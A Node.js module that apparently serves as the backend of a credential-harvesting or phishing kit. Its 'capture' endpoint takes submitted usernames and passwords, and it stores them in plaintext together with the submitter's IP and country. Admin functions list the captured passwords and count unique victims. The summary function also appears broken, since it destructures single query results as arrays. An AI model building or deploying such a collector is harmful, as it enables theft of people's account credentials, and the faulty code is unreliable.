'use strict';

// In-memory store for submissions (used when no database is configured)
let memorySubmissions = [];
let memoryId = 0;

// Lazy-load pg only in serverless environment (not during build)
let Pool = null;
let adminPool = null;
let userPool = null;

function initPools() {
  if (Pool === null) {
    try {
      const pg = require('pg');
      Pool = pg.Pool;
    } catch (e) {
      console.warn('pg module not available in this environment');
    }
  }
  
  if (Pool && process.env.ADMIN_DATABASE_URL) {
    adminPool = new Pool({ connectionString: process.env.ADMIN_DATABASE_URL });
  }
  if (Pool && process.env.USER_DATABASE_URL) {
    userPool = new Pool({ connectionString: process.env.USER_DATABASE_URL });
  }
}

initPools();

async function getSubmissions(limit = 100, offset = 0) {
  if (adminPool) {
    const client = await adminPool.connect();
    try {
      const result = await client.query('SELECT id, username, password, method, ip, country, city, created_at FROM submissions ORDER BY id DESC LIMIT $1 OFFSET $2', [limit, offset]);
      return result.rows;
    } finally { client.release(); }
  }
  // Return in-memory submissions
  return [...memorySubmissions].sort((a, b) => b.id - a.id).slice(offset, offset + limit);
}

async function getSubmissionsSummary() {
  if (adminPool) {
    const client = await adminPool.connect();
    try {
      const [{ rows: [{ count: total }] }] = await client.query('SELECT COUNT(*) FROM submissions');
      const [{ rows: [{ count: uniqueUsernames }] }] = await client.query("SELECT COUNT(DISTINCT username) FROM submissions WHERE username != ''");
      const [{ rows: [{ count: uniqueIps }] }] = await client.query("SELECT COUNT(DISTINCT ip) FROM submissions WHERE ip IS NOT NULL");
      return { total: Number(total), uniqueUsernames: Number(uniqueUsernames), uniqueIps: Number(uniqueIps) };
    } finally { client.release(); }
  }
  const total = memorySubmissions.length;
  const uniqueUsernames = new Set(memorySubmissions.map(s => s.username)).size;
  const uniqueIps = new Set(memorySubmissions.map(s => s.ip)).size;
  return { total, uniqueUsernames, uniqueIps };
}

const createCaptureHandler = () => async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
  
  const { username, password, method, ip, country } = req.body;
  
  if (!username || !method) {
    return res.status(400).json({ error: 'Missing username or method' });
  }

  const submission = {
    id: ++memoryId,
    username,
    password: password || '',
    method,
    ip: ip || req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1',
    country: country || 'Unknown',
    city: 'Unknown',
    created_at: new Date().toISOString()
  };

  if (adminPool) {
    try {
      const client = await adminPool.connect();
      try {
        const result = await client.query(
          'INSERT INTO submissions (username, password, method, ip, country, created_at) VALUES ($1, $2, $3, $4, $5, NOW()) RETURNING id',
          [username, password || '', method, submission.ip, country || 'Unknown']
        );
        return res.status(201).json({ ok: true, id: result.rows[0].id });
      } finally { client.release(); }
    } catch (error) {
      console.error('Capture error:', error);
      return res.status(500).json({ error: 'Database error' });
    }
  }
  
  // Store in memory
  memorySubmissions.push(submission);
  
  // Also return success
  return res.status(201).json({ ok: true, id: submission.id });
};

module.exports = { 
  createCaptureHandler, 
  getSubmissions, 
  getSubmissionsSummary, 
  adminPool, 
  userPool,
  getMemorySubmissions: () => memorySubmissions,
  clearMemorySubmissions: () => { memorySubmissions = []; }
};